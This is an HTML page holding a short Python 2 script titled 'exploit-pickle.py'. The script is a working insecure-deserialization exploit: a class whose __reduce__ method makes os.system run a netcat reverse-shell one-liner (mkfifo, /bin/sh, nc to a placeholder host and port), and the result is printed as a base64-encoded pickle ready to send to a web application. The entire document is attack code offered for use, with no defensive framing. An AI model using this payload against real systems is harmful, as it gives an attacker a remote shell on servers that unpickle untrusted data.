<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>exploit-pickle.py</title>
</head><body>#!/usr/bin/env python<br/>
#ensure you're sending the correct content-type in your web request<br/>
<br/>
import pickle<br/>
from base64 import urlsafe_b64encode as b64encode<br/>
<br/>
RUNME = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; &lt;LIP&gt; &gt;/tmp/f"""<br/>
<br/>
#Deserialization vulnerability in Pickle __reduce__<br/>
#Exploit of things that are 'non-deserializable' are passed to reduce as a final exception<br/>
class PleaseSubscribe(object):<br/>
&nbsp; &nbsp; def __reduce__(self):<br/>
&nbsp; &nbsp; &nbsp; &nbsp; import os<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return (os.system,(RUNME,))<br/>
<br/>
print b64encode(pickle.dumps(PleaseSubscribe()))</body></html>